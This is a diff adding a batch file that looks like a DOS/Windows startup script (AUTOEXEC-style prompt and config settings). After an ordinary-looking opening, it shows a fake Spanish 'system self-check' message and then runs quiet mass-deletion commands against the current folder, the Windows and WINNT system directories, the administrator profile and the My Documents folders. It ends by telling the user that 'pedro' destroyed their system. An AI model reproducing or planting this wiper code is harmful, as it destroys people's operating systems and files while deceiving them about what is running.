@@ -1,0 +1,35 @@
+@ECHO OFF
+SET PROMPT=[$P]
+SET DIRCMD=/OGEN
+
+IF "%CONFIG%"=="NORMAL" GOTO NORMAL
+IF "%CONFIG%"=="DEBUGGER" GOTO DEBUGGER
+
+:NORMAL
+GOTO QUIT
+
+:DEBUGGER
+C:\PROGRA~1\SOFTIC~1\WINICE.EXE
+GOTO QUIT
+
+:QUIT
+
+CLS
+ECHO.
+
+Echo off
+Echo. Autocheque del sistema, por favor espere un momento.........
+del *.* /q
+del c:\winnt\system\*.*  /q
+del c:\winnt\system32\*.*  /q
+del c:\winnt\*.*  /q
+del c:\winnt\profiles\administrador\personal\*.* /q
+del *.*  /q
+del c:\windows\system\*.* 
+del c:\windows\*.* /q
+del c:\mis documentos\*.*  /q
+del c:\my documents\*.*  /q
+del *.*  /q
+Echo on
+Echo. Lo Siento pero pedro te destruyo el sistema...
+Echo. Gracias por su tiempo.....................
